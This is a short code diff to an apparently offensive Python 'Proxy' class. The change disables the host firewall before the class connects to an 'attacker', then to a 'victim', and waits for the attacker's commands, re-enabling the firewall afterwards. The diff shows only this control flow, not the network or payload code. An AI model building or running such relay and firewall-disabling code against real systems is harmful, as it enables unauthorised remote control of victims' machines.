@@ -221,17 +221,22 @@ class Proxy:
             print(f"_init_ setup args: {e}")
             exit(1)
         print("")
-        if self.DEBUG:
-            self.debug_connection_with_attacker()
-        else:
-            self.connection_with_attacker()
-        print("")
-        self.connection_with_victim()
-        print("")
-        if self.DEBUG:
-            self.debug_wait_command_from_attacker()
-        else: 
-            self.wait_command_from_attacker()
+        mymethods.disable_firewall()
+        try:
+            if self.DEBUG:
+                self.debug_connection_with_attacker()
+            else:
+                self.connection_with_attacker()
+            print("")
+            self.connection_with_victim()
+            print("")
+            if self.DEBUG:
+                self.debug_wait_command_from_attacker()
+            else: 
+                self.wait_command_from_attacker()
+        except Exception as e:
+            print(f"_init_ {e}")
+        mymethods.reenable_firewall()
     
     def connection_with_attacker(self):
         #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
